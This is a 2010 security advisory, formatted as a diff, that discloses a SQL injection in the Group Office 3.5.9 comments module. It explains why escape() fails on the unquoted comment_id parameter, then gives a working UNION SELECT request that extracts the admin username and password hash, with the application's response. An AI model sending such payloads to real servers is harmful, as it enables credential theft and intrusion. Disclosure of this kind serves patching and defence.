@@ -1,0 +1,58 @@
+# Title
+Group Office Remote SQL Injection Vulnerability
+
+# Author
+ADEO Security
+
+# Published
+17/07/2010
+
+# Version
+3.5.9 (Possible all versions)
+
+# Vendor
+http://www.group-office.com
+
+# Download
+http://sourceforge.net/projects/group-office/files/3.5/groupoffice-com-3.5.9.tar.gz/download
+
+# Description
+"Take your office online with Group-Office groupware. Share projects,
+calendars, files and e-mail online with co-workers and clients. Easy
+to use and fully customizable, Group-Office takes online collaboration
+to the next level."
+
+# Credit
+Vulnerability founded by Canberk BOLAT
+	- Mail: security[AT]adeo.com.tr
+	- Web: http://security.adeo.com.tr , http://adeosecuritylabs.com
+
+# Vulnerability
+Remote attacker can inject sql codes to the system that host target
+web application. Its high level vulnerability.
+
+modules/comments/json.php:
+23	$comment = $comments->get_comment(($_REQUEST['comment_id']));
+
+
+In json.php 'get_comment' method called with value of HTTP Request
+that's name 'comment_id'. In the 'get_comment' method, variable
+'$comment_id' inserted to sql query and executed by application.
+
+modules/comments/classes/comments.class.inc.php:
+function get_comment($comment_id)
+{
+$this->query("SELECT * FROM co_comments WHERE id=".$this->escape($comment_id));
+...
+
+'escape' method can't prevent because attacker don't need single
+quotes for successful exploitation.
+
+# Exploitation
+Request: http://server/groupoffice/modules/comments/json.php?task=comment&comment_id=888881+union+select+1,2,3,4,5,6,(select+concat_ws(0x3a,username,password)+from+go_users+where+id=1)
+
+Response: {"data":{"id":"1","link_id":"2","link_type":"3","user_id":"4","ctime":"01-01-1970
+1:00","mtime":"01-01-1970
+1:00","comments":"admin:$1$sM5wjKS9$wJPfZZWO53uu8eCxjOesS\/","user_name":""},"success":true}
+
+Application's response contains result of the attacker's injected sql codes.
